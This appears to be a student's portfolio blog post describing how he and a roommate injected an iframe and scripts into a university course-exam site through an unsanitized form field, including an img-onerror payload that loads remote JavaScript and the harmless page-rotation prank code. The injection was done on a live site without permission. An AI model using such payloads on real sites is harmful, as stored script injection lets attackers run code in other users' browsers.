---
layout: default
title: Skule Security Sillyness
permalink: /evaluations/skulecourses/index.html
group: evaluations
---
<div class="block">
<div class="text-block">
<p>
	My room mate <a href="http://zhuoweizhang.net">Zhuowei</a> and I explored how secure <a href="http://courses.skule.ca">Skule's (U of T Engineering) courses page</a> is,  
	since it is host to supposed past exams that most U of T students download without a second thought.  
</p>
<p>
	This was done mostly for fun and curiosity, with no malicious intent; <strong>preserving the pages' usability was a primary concern</strong>.  
</p>

<p>
	The pages that were pranked include: <a href="http://courses.skule.ca/course/?q=CSC180H1">CSC180</a> | <a href="http://courses.skule.ca/course/?q=ESC103H1">ESC103</a> | <a href="http://courses.skule.ca/course/?q=PHY180H1">PHY180</a>  
	In case those pages were taken down, you can see the scripts in action: <a href="esc103.html">Sample ESC103</a> | <a href="phy180.html">Sample PHY180</a>  
</p>
<p>
	Message to all readers and possibly maintainers of Skule:  
	Please sanitize input boxes before injecting content into the page; it's too easy for someone to insert an <code>< a></code> tag redirecting to a malicious site!  
</p>
<p>
<strong>UPDATE (Dec 22, 2013)</strong>: Fortunately Skule fixed this exploit! You can still check out the effect from the sample pages.  
</p>
</div>

<h2 class="anchor">Injecting Code (the clever part) <a class="anchor-link" title="permalink to section" href="#injection" name="injection">¶</a></h2>
<hr>
<div class="text-block">
<p>
	Before altering the actual course pages, an illegitimate course was created to allow prototyping.  
	Skule's search cannot find the course, but direct access through URL allows access to upload and view.  
</p>
<p>
	The first page to be "improved" was CSC180, which had an iframe element injected through the "Display As" field.  
	Apparently <strong>no sanitation of inputs is done...</strong>  
</p>

<div class="frames">
<img src="dirtyinputs.png">
<p>Protect against spam... But what of dirty injections!?!</p>
</div>

<p>
	The code for the CSC180 page was written by Zhuowei while I wrote the code for the ESC103 page.  
	The PHY180 page's <a href="https://code.google.com/p/gravityscript/">GravityScript</a> was written by Mr.Doob for Google and we simply embedded it into the page using the method below.  
</p>
<p>
	The embedding for the CSC180 page was trivial since no scripting was required,  
	but adding a script for the ESC103 and PHY180 pages were much more difficult.  
</p>
<p>
	Just adding a <xmp>< script></xmp> element didn't work.   
	<xmp><script src="some pastebin url"> </script></xmp>
	After exhausting the possibilities by splitting the string up and concatenating them like <xmp>"<scr" + "ipt>"</scr>"</xmp> and escaping the characters like  
	<xmp>&quot;&lt;scr&quot; + &quot;ipt&gt;&quot;"</xmp> we determined that the input ate script tags, apparently.  
</p>
<p>
	Our workaround was to use an impossible to load <xmp><img></xmp> element that points to our script with its onerror attribute.
	<xmp><img onerror="a=document.createElement(&quot;script&quot;);a.src=&quot;url to our code&quot;;document.body.appendChild(a)" src="http://localhost:1"></xmp>
</p>
It will always load my script because http://localhost:1 as an image can never load!
</div>

<h2 class="anchor">Javascript (the dumb part) <a class="anchor-link" title="permalink to section" href="#code" name="code">¶</a></h2>
-------------------------
<div class="text-block">
<p>
	I took this as an opportunity to get familiar with Javascript, seeing as I recently learned HTML and CSS for this portfolio.  
	Gaining proficiency in JS will complete my skill set as a web developer, which will be widely useful since the web is becoming a larger distributor of applications.  
	Web apps are robust in being 100% cross-platform, requiring just a browser to function on any OS and device, compatible with my philosophy for robustness.  
</p>
<p>
	The idea was to create an effect that was immediately noticeable yet is easy to turn off to preserve usability.  
	Seeing as this was our linear algebra course, I went with rotating the page, which is a linear transformation :D.  
	A large button was placed in the centre of the page to make it easy for people to return the page to normal since its location will stay still.
</p>
<pre><code>var timer = setInterval(transform,50);
var degreez = 0;
var allSet = false;
var bellybutton;
function transform(){
	if (!allSet) {
		var transOrigin = "50% 50%";
		document.body.parentElement.style.height = "100%";
		document.body.style.minHeight = "100%";
		document.body.style.transformOrigin = transOrigin;
		document.body.style.webkitTransformOrigin = transOrigin;
		document.body.style.mozTransformOrigin = transOrigin;
		bellybutton = document.createElement("button");
		bellybutton.innerHTML = "CLICK TO STOP PUKING";
		bellybutton.style.position = "absolute";
		bellybutton.style.left = "45%";
		bellybutton.style.top =  "45%";
		bellybutton.style.width = "10%";
		bellybutton.style.height =  "10%";
		document.body.appendChild(bellybutton);
		bellybutton.onclick = stoppuking;
		allSet = true;
	}
	var transString = "rotate(" + degreez + "deg)";
	document.body.style.transform = transString;
	document.body.style.webkitTransform = transString;
	document.body.style.mozTransform = transString;
	degreez += 1;
}
function stoppuking(){
	clearInterval(timer);
	var transString = "";
	document.body.style.transform = transString;
	document.body.style.webkitTransform = transString;
	document.body.style.mozTransform = transString;
	document.body.removeChild(bellybutton);
}
</code></pre>

<p>
	This code was designed to work on all browsers and devices (webkit, moz, and unnamed),  
	and a button was chosen because it can be clicked on all devices, whereas some other mechanisms  
	such as onhover aren't mobile compatible.  
</p>
<p>
	Lastly, I'll leave how we changed the years to an arbitrary number as an anagram, decode it if you can:  
	a cad ed retelevise fill unlit  (It is in English, has 1 verb, 1 noun, and 3 adjectives)
</p>
</div>

<h2 class="anchor">Gains from Experience <a class="anchor-link" title="permalink to section" href="#gains" name="gains">¶</a></h2>
---------------------------
- Javascript experience and interest in web development
- Appreciation of sanitizing inputs
- Knowledge of this issue to Skule maintainers that they may fix it
- Fun :D

</div>